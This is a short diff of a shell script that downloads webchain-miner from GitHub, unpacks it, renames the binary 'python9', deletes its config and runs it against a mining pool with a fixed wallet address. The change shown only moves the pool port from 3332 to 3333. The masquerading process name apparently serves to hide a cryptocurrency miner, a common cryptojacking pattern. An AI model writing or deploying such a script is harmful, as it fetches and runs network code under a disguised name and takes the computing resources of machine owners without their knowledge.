@@ -30,6 +30,6 @@ wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0
 tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
 mv webchain-miner python9
 rm config.json
-./python9 -o web-ko1.gonspool.com:3332 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python9 -o web-ko1.gonspool.com:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
